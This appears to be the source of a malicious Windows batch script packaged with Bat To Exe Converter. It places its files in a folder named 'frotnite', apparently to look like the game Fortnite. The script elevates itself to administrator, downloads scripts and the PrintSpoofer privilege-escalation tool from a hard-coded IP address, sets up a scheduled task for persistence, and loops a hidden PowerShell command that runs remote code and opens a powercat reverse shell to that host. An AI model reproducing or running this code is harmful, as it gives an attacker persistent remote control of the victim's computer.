::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCiNP3q3A7sgzOfs4eaIo0kOaO86a5za3bGcKeVd+kHiFQ==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDdbTxWPOWWGIroL5uT07u6UnnIiXeEwR7DW07ecL/Mc7FHhcZEoxn5cp9wFAh9XaQGUP18Lq3d9sWuBM8KPoAb7S0aI60IPH2Z433HW3WUyY9wI
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZks0
::ZQ05rAF9IBncCkqN+0xwdVsFAlTi
::ZQ05rAF9IAHYFVzEqQIADD00
::eg0/rx1wNQPfEVWB+kM9LVsJDDSmGgs=
::fBEirQZwNQPfEVWB+kM9LVsJDDSmGgs=
::cRolqwZ3JBvQF1fEqQIADD00
::dhA7uBVwLU+EWHSN91A/OxRSWESrMmj0Zg==
::YQ03rBFzNR3SWATExGYWSA==
::dhAmsQZ3MwfNWATE2UszOhRHQwKWfEK0Bft8
::ZQ0/vhVqMQ3MEVWAtB9weVUELA==
::Zg8zqx1/OA3MEVWAtB9weVUELA==
::dhA7pRFwIByZRRm00GRQ
::Zh4grVQjdCyDJGyX8VAjFDdbTxWPOWWGK6AP4evH4u+UsUwaUfA2fcHL3rLAJfgWig==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
cd /D c:/
mkdir frotnite
cd /D c:/frotnite
curl --output log.ps1 82.65.68.158/yl1.ps1
curl --output log.vbs 82.65.68.158/log.vbs
curl --output hander.bat 82.65.68.158/hander.bat
curl --output conn.bat 82.65.68.158/conn.bat
curl --output prs.exe 82.65.68.158/printspoofer.exe
schtasks /create /tn "My App" /np /tr "cmd /c cd c:/frotnite&&start log.vbs"  /sc minute /mo 10
cd /D c:/frotnite
start log.vbs
 :loop
 powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://82.65.68.158/power.ps1');powercat -c 82.65.68.158 -p 2568 -e cmd"
 goto loop"
